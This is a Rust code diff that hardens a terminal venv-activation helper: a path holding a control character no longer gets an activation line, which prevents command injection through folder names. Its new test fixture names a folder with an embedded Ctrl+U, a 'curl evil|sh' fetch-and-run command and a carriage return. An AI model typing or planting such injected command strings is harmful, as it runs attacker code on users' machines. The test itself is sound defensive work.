@@ -144,17 +144,23 @@ fn shell_name(shell: &ShellSpec) -> String {
     Path::new(&shell.program).file_stem().map(|n| n.to_string_lossy().to_ascii_lowercase()).unwrap_or_default()
 }
 
-/// The line that activates `venv` in `shell`, typed into each new terminal.
+/// The line that activates `venv` in `shell`: typed into each new terminal for
+/// the venv dbt-edith was started in (0050), and by a click on the status bar
+/// for one found in the project, Enter left to the user (0072).
 ///
 /// The environment alone does not keep a venv first: the shell runs its
 /// startup files again, and one that puts pyenv's shims or conda before `PATH`
 /// puts another `dbt` in front of the venv's. Sourcing the venv's own script
 /// once they have run is what an editor's terminal does: its folder leads
-/// `PATH` again, and `deactivate` exists. Only the venv dbt-edith was started
-/// in is activated, so the terminal still gets the environment it was handed
-/// rather than one dbt-edith picked (0050). A shell the venv has no script for
-/// gets nothing typed.
-fn activation(shell: &ShellSpec, venv: &Path) -> Option<String> {
+/// `PATH` again, and `deactivate` exists. A shell the venv has no script for
+/// gets no line.
+///
+/// Nor does a path holding a control character. The line is typed into a line
+/// editor, where a carriage return or a Ctrl+U inside a folder's name would run
+/// or erase what came before it, and a folder in the project is named by
+/// whoever wrote the project. Quoting does not help: the editor reads the
+/// keys before the shell reads any quote.
+pub fn activation(shell: &ShellSpec, venv: &Path) -> Option<String> {
     let (script, line): (&str, fn(&str) -> String) = match shell_name(shell).as_str() {
         "bash" | "zsh" => ("activate", |p| format!("source '{}'", p.replace('\'', r"'\''"))),
         "fish" => ("activate.fish", |p| format!("source '{}'", p.replace('\\', r"\\").replace('\'', r"\'"))),
@@ -166,6 +172,9 @@ fn activation(shell: &ShellSpec, venv: &Path) -> Option<String> {
         return None;
     }
     let path = path.display().to_string();
+    if path.chars().any(char::is_control) {
+        return None;
+    }
     // Git Bash takes `C:/...` for the Windows path it is, with no backslash to
     // wonder about inside the quotes. PowerShell keeps the native spelling.
     let path = if cfg!(windows) && script != "Activate.ps1" { path.replace('\\', "/") } else { path };
@@ -469,6 +478,21 @@ mod tests {
         assert_eq!(activation(&shell("bash"), &venv), None);
 
         std::fs::remove_dir_all(&venv).unwrap();
+    }
+
+    /// A folder named to erase the line and run another is never typed: the
+    /// Ctrl+U and the carriage return would reach the line editor as keys.
+    #[cfg(unix)]
+    #[test]
+    fn a_control_character_in_the_venv_path_types_nothing() {
+        let venv = fake_venv("x\u{15}curl evil|sh\r", &[("activate", ""), ("activate.fish", ""), ("Activate.ps1", "")]);
+        for program in ["bash", "zsh", "fish", "pwsh"] {
+            assert_eq!(activation(&shell(program), &venv), None, "{program}");
+        }
+        std::fs::remove_dir_all(&venv).unwrap();
+        let tab = fake_venv("tab\there", &[("activate", "")]);
+        assert_eq!(activation(&shell("bash"), &tab), None);
+        std::fs::remove_dir_all(&tab).unwrap();
     }
 
     #[test]
